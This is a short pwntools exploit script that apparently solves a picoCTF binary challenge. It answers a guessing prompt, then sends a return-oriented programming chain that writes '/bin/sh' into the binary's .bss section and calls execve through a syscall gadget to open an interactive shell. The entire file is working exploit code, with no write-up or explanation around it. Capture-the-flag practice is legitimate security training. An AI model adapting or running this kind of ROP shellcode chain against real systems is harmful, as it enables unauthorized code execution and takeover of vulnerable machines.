#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./vuln')

host = args.HOST or 'jupiter.challenges.picoctf.org'
port = int(args.PORT or 38467)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = '''
b *win+75
continue
'''.format(**locals())

# - Step 1 -- Write-what-where gadgets

# 	[+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
# 	[+] Gadget found: 0x410ca3 pop rsi ; ret
# 	[+] Gadget found: 0x4163f4 pop rax ; ret
# 	[+] Gadget found: 0x445950 xor rax, rax ; ret

ret = 0x400416
pop_rdi = 0x400696
pop_rax = 0x4163f4
pop_rsi = 0x410ca3
pop_rdx = 0x44a6b5
# objdump -h ./vuln
section_bss = 0x6bc3a0
mov_rsi_rax = 0x47ff91
syscall = 0x40137c

io = start()
io.recvuntil(b'guess?\n')
io.sendline(b'84')
io.recv()

# writing /bin/sh to .bss
pay = asm('nop') * 120
pay += p64(pop_rax)
pay += b"/bin/sh\x00"
pay += p64(pop_rsi)
pay += p64(section_bss)
pay += p64(mov_rsi_rax)

# execve("/bin/sh", NULL, NULL)
pay += p64(pop_rax)
pay += p64(0x3b)
pay += p64(pop_rdx)
pay += p64(0x0)
pay += p64(pop_rsi)
pay += p64(0x0)
pay += p64(pop_rdi)
pay += p64(section_bss)
pay += p64(syscall)

io.sendline(pay)
io.interactive()
